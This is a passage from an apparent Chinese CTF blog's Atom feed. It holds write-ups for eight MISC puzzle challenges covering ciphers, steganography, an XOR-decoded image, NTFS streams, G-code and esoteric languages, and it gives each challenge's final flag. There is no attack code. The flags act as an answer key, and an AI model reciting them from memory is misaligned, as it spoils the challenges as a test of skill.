&lt;h3&gt;&lt;span id=&quot;21&quot;&gt;21&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;网鼎杯-2020-青龙组虚幻2&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-3</title>
    <link href="http://mklkx.github.io/2021/03/22/MISC-3/"/>
    <id>http://mklkx.github.io/2021/03/22/MISC-3/</id>
    <published>2021-03-22T12:00:00.000Z</published>
    <updated>2021-05-04T11:38:56.511Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="simple">simple</span></h2><hr><h3><span id="41">41</span></h3><h4><span id="2021年春秋杯新年欢乐赛十二宫的挑衅">2021年“春秋杯”新年欢乐赛【十二宫的挑衅】</span></h4><blockquote><p>但愿你能解出密文，不然我就会继续犯罪:)本题获取flag提交前请加上flag{}</p></blockquote><p>通过查询发现是历史真实案件改编，根据新闻报道，对以下符号做如下处理</p><p>1）将图片中的符号一一放入excel中</p><p>2）按报道对符号进行处理</p><p><img lazyload src="/images/loading.svg" data-src="%E5%8D%81%E4%BA%8C%E5%AE%AB.jpg" alt="十二宫"></p><p>3)将符号放入txt中，利用AZdecrypt1.19</p><p><img lazyload src="/images/loading.svg" data-src="%E5%8D%81%E4%BA%8C%E5%AE%AB.png" alt="十二宫"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;WUUHUUTAKEOFF&#125;</span><br></pre></td></tr></table></figure><h3><span id="42">42</span></h3><h4><span id="很好的色彩呃">很好的色彩呃？</span></h4><blockquote><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote></blockquote><p>根据题目提示：颜色</p><p>打开PS，取色器提取颜色的十六进制</p><p><img lazyload src="/images/loading.svg" data-src="ps.PNG" alt="ps"></p><p>分别为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8b8b61</span><br><span class="line">8b8b61</span><br><span class="line">8b8b70</span><br><span class="line">8b8b6a</span><br><span class="line">8b8b65</span><br><span class="line">8b8b73</span><br><span class="line"></span><br><span class="line">&gt;&gt;6161706A6573</span><br><span class="line">HEX&gt;&gt;</span><br><span class="line">aapjes</span><br></pre></td></tr></table></figure><p>flag{aapjes}</p><h3><span id="43">43</span></h3><h4><span id="guet-ctf2019520的暗示"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到photo.dat，与0x33异或</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data &#x3D; open(&quot;photo.dat&quot;,&#39;rb&#39;)</span><br><span class="line">strs &#x3D; data.read()</span><br><span class="line">flag &#x3D; open(&quot;1.jpg&quot;,&#39;ab+&#39;)</span><br><span class="line">for i in strs:</span><br><span class="line">    flag.write(bytes([i ^ 0x33]))</span><br></pre></td></tr></table></figure><p>得到一张运营商的定位</p><p>根据LTE可以定位基站地址http://www.gpsspg.com/bs.htm</p><p>flag{桂林电子科技大学花江校区}</p><p>妙啊</p><h3><span id="44">44</span></h3><h4><span id="key不在这里"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>一张二维码，扫码得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m&#x3D;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs&#x3D;n&amp;form&#x3D;QBRE&amp;sp&#x3D;-1&amp;sc&#x3D;0-38&amp;sk&#x3D;&amp;cvid&#x3D;2CE15329C18147CBA4C1CA97C8E1BB8C</span><br></pre></td></tr></table></figure><p>直接搜索无所得</p><p>观察得，102，108，97，103等老朋友</p><p>十进制转ascii</p><p>urldecode</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></pre></td></tr></table></figure><h3><span id="45">45</span></h3><h4><span id="inshack2018self-congratulation"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>明显图片中存在一块类似二维码的黑白块</p><p><img lazyload src="/images/loading.svg" data-src="bin.PNG" alt="bin"></p><p>考虑转换为二进制</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">001100010011001000110011001101000011010100110110001101110011100000</span><br></pre></td></tr></table></figure><p>转换为ascii失败</p><p>转换为字符串https://www.qqxiuzi.cn/bianma/erjinzhi.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;12345678&#125;</span><br></pre></td></tr></table></figure><h3><span id="46">46</span></h3><h4><span id="inshack2019gflag"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">My brother likes esoteric programming. He sent me this file but I don&#39;t see what it is for. Could you help me ?</span><br><span class="line"></span><br><span class="line">[GFlag files](https:&#x2F;&#x2F;static.ctf.insecurity-insa.fr&#x2F;a7572eb34ba9700b39f1ba7f5869bf301b67d406.tar.gz)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和类似这样的1755行字符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">M73 P0 R2</span><br><span class="line">M201 X9000 Y9000 Z500 E10000</span><br><span class="line">M203 X500 Y500 Z12 E120</span><br><span class="line">M204 P2000 R1500 T2000</span><br><span class="line">M205 X10.00 Y10.00 Z0.20 E2.50</span><br><span class="line">M205 S0 T0</span><br><span class="line">M107</span><br></pre></td></tr></table></figure><p>通过查询得知这是一种G语言</p><p>以及网站<a class="link" href="https://ncviewer.com/">https://ncviewer.com/<i class="fas fa-external-link-alt"></i></a></p><p>类似画图的意思</p><p><img lazyload src="/images/loading.svg" data-src="G.PNG" alt="G"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3d_pr1nt3d_fl49&#125;</span><br></pre></td></tr></table></figure><h3><span id="47">47</span></h3><h4><span id="gkctf2020sail-a-boat-down-the-river"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交Hint:闪烁的光芒;是一行不是一列;加密方式很常见</p></blockquote><p>挺有意思但是也挺让人难受的题目</p><p>得到flag.mp4和vocal.rar</p><p>flag.mp4是一段监控，能得到一张二维码</p><p>给出一个加密的网盘地址</p><p><a class="link" href="https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ">https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ<i class="fas fa-external-link-alt"></i></a></p><p>根据提示1，反复观看视频，根据中央闪烁的光芒，得到一段摩斯电码：</p><p>-.-- .-- —… --.</p><p>yw8g</p><p>从而得到网盘里的数独题：</p><p><img lazyload src="/images/loading.svg" data-src="shudu.PNG" alt="shudu"></p><p>得到密钥52693795149137</p><p>需要密钥的常用密码？</p><p>首选AES</p><p>成了，<a class="link" href="http://GG0kc.tf">GG0kc.tf<i class="fas fa-external-link-alt"></i></a></p><p>得到ovex文件，利用overture打开，</p><p>音符中找到’fun}‘,‘is_’,’{gkctf_’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;gkctf_is_fun&#125;</span><br></pre></td></tr></table></figure><h3><span id="48">48</span></h3><h4><span id="npuctf2020碰上彩虹吃定彩虹"></span></h4><blockquote><p>得到的 flag 建议包上 flag{} 提交。感谢西北工业大学信息安全协会供题。</p></blockquote><p>老千层饼了</p><p>得到lookatme.txt,maybehint.txt,secret</p><p>1)先看lookatme.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">achnrvxzzuglarucalznwcygfggrufryvbzqjoxjymxvchhhdmliddcwmhghclpebtzwlojvew</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>notepad++能看到末尾存在莫斯电码，解码：AUTOKEY</p><p>通过查询，为一种加密方法，得到解密脚本</p><p><a class="link" href="https://github.com/hitcxy/break_autokey">https://github.com/hitcxy/break_autokey<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/<i class="fas fa-external-link-alt"></i></a></p><p>得到：IAMTHEPASSWD</p><p>2)再看maybehint.txt</p><p>通过vim查看，能看到一些&lt;200b&gt;&lt;200c&gt;&lt;200d&gt;字样，通过宽字符隐写解密网站http://330k.github.io/misc_tools/unicode_steganography.html，末尾需要设置勾选</p><p><img lazyload src="/images/loading.svg" data-src="%E5%AE%BD%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99.PNG" alt="宽字符隐写"></p><p>能得到提示:do u know NTFS?</p><p>打开NtfsStreamsEditor2，对整个文件夹进行扫描，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;wwZlZ&#x3D;8W&#x3D;cndwljcdcG8wdj8W8Z8dZllGjZc&#x3D;8lWjnlWd8WwZ5j&#x3D;l8ccWZcZGjd5ZwZ5WZ8d&#x3D;Zcwjwl5Gnn&#x3D;WdwcwlnWd5lGnZWlnnwdnjnw8ndnc58d5cndl&#x3D;njZl&#x3D;WddjwWWwZllj5c5jGwZnZ5W&#x3D;cZljdwd8c&#x3D;85ndGGljcl5ccwd&#x3D;W&#x3D;l8w&#x3D;5lwWn8WnwnWlGZwdcnGGl5G&#x3D;8W&#x3D;&#x3D;cnnWZnWjZ&#x3D;wWcGwZcWc8ncWW&#x3D;5jnWwcZl8W&#x3D;8cdwWldlnwW5ddwlnlwncWlcwGZddj5djZWc5jcWdn5jdjwnj85GWGjnjwGd&#x3D;jZGj5j&#x3D;&#x3D;jwjlw8dlwWj5Wjn5n8dwwdjZlc5lZwdWldZlnGwl85cWnjd&#x3D;WcWlwj8WGdlGncnZWGGd5ZncW5d55nW5wl&#x3D;Wj8jGWnWj8jwZ&#x3D;ZwWZ88nWG5nn5WlWnGdWw5Zn8jdl&#x3D;nGcnll8WncZjnGn&#x3D;dlwn5W8wlWjlnl5ccnGWGnnnc58WnjlGnG55Zwdn5cZdjdZZ5WljG5G5wcldd&#x3D;Wlc8Z&#x3D;8nGj&#x3D;jWd8w8Wd&#x3D;w8nccc8wZdjcnGdljZnnj5ww8885&#x3D;lcWW8W8j5dG8jZZwG55GjnwZ&#x3D;W5Z8G5ZlGc5ZZncZ5cd8j85GW5nj&#x3D;WWncn55Gj5nj5nwnW58jG8GcnjZdWcl8wj8n&#x3D;cj&#x3D;8l8cn5jjcjn8lldn&#x3D;Gjw8&#x3D;cjcdWWjGddZljdjdZnG8djnZccZldlWllw5ZZ8wj5Gn&#x3D;&#x3D;5w8Z&#x3D;j55n&#x3D;ZZ5wdww8lndwd8Wlj8WGjnl&#x3D;nncZ&#x3D;W8ZZWZnjjlwWGZZlZc5c&#x3D;&#x3D;d8Zl855wZn&#x3D;W&#x3D;w8wWjZ85cGc&#x3D;&#x3D;5Z8ccjdw5GnZWnGjcdGGnZ5wwwWGG5d&#x3D;W5ldjwGZZdZwdG5cGGnZGlGc&#x3D;W5ccWZ8&#x3D;cGljdGcdld&#x3D;8cj8jwn&#x3D;lj88ZZ5jn5lcZ&#x3D;Gdw&#x3D;Zl58WZZl5ccwccwG5d5w8Z5wllj5ddnn&#x3D;5&#x3D;w8588WwGj&#x3D;l5G55dWG8cl&#x3D;GcjWwlwG&#x3D;lWWnZ&#x3D;dZG85Gcjc5&#x3D;wnw&#x3D;j&#x3D;&#x3D;Gndnddjwn5c&#x3D;c5W5wwdWlG5nWZwnGw8&#x3D;lcWldcwnG5Wcjj&#x3D;cWlGZc8Gn58ZWjZ85ljlncZj5cc&#x3D;dZWGjd&#x3D;d8ncZ8www55&#x3D;cw&#x3D;GWZn5ZZlnWld&#x3D;cWcnclWlZG5djGW&#x3D;cl8&#x3D;ZG8cZwwc8wl&#x3D;88W5ZwZ&#x3D;jwZGGlcWcWnZZ5Zj5w5ZdZclZZWnccGw&#x3D;&#x3D;cG8W8ZWlc8wcZ555Z85ljWG5jZ&#x3D;8&#x3D;wllWjWjlZc5lG8cwWlnjlGlW&#x3D;l5&#x3D;n&#x3D;lGwnjGGjGdwj85ddW5ZwZ&#x3D;ddjWldj&#x3D;cjljjGwndZjWWZGcdWcZW5cdldj8WZjGljlWncZ5&#x3D;8jnZWjl8wjZG5Zwlcl5dd</span><br></pre></td></tr></table></figure><p>明显词频分析：ZW5jcnlwdG8=</p><p>base后：encrypto</p><p>通过查询，encrypto为一加密软件https://macpaw.com/encrypto</p><p>加密后统一后缀为.crypto</p><p>更改secret为secret.crypto</p><p>3)结合lookatme.txt中得iamthepasswd，尝试解密</p><p>始终无法解密，卡住</p><p>strings secret.crypto，发现异常字符(Oh! You caught me! But…)</p><p>在010中选中并删除后，重新保存，解密</p><p>得到彩虹.png</p><p>得益于做题经验，放进ps，查看相近的黄色色块，得到不同之处:112 64 115 115 87 100</p><p>p@ssWd</p><p>尝试提交flag，错误</p><p>继续查看图片，更改后缀为.zip，解密得到弗拉格.docx</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eeeeeeeeeepaeaeeeaeAeeeeeeaeeeeeeeeeeccccisaaaaeejeeeeeejiiiiiiLiiiiijeeeeeejeeeeeeeeeeeeeeeeeeeejcceeeeeeeeeeePeeeeeeeejaaiiiiiiijcciiiiiiiiiijaaijiiiiiiiiiiiiiiiiiiiijeeeeeeHeeeeeeeeeeeeeeeeejcceeeeeeeeeeeejaaiiiijeeeeeeejceeeeeeeeeeeeeeeeeeeeeeeeejceeeeeeeeeeeeeeeeejaeeeeeejciiUiiiiiiiiiiiiiiiiijaeeeejceeeeeeeeeCeeeeeeeeejajciiiiiiiiiiiiiiiiiiijaaiiiijiijeeeeeeeeeeejKcciiiiiiiiiiiiiiijaaij</span><br></pre></td></tr></table></figure><p>捡出大写字母ALPHUCK</p><p><a class="link" href="https://www.dcode.fr/alphuck-language">https://www.dcode.fr/alphuck-language<i class="fas fa-external-link-alt"></i></a></p><p>解密得</p><p><img lazyload src="/images/loading.svg" data-src="alphuck.PNG" alt="alphuck"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1t&#39;s_v3ry_De1iCi0us~!&#125;</span><br></pre></td></tr></table></figure><p>好家伙</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;simple&quot;&gt;simple&lt;/span&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;41&quot;&gt;41&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;2021年春秋杯新年欢乐赛十二宫的挑衅&quot;&gt;2021年“春秋杯”新年欢乐赛【十二宫的挑衅】&lt;/s</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
</feed>
